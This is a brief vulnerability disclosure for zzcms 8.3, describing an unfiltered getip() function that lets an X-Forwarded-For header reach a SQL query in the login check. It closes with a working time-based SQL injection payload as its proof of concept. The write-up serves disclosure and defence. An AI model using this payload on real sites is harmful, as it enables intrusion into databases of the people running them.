# zzcms 8.3 SQL injection
## CMS
zzcms v8.3   http://www.zzcms.net/
## Vulnerability details
position:  $ip parameter **/user/logincheck.php** in line 21 
![postion](https://github.com/seedis/zzcms/blob/master/1.png)
$ip from getip() and it defines  in **/inc/function.php**
![](https://github.com/seedis/zzcms/blob/master/2.png)
The getip() function does not have any security filtering. SQL injection can be caused by constructing the **X-Forwarded-For** parameter.
## POC
```
X-Forwarded-For:127.0.0.1' or (select * from (select sleep(2))b)#
```
![](https://github.com/seedis/zzcms/blob/master/3.png)
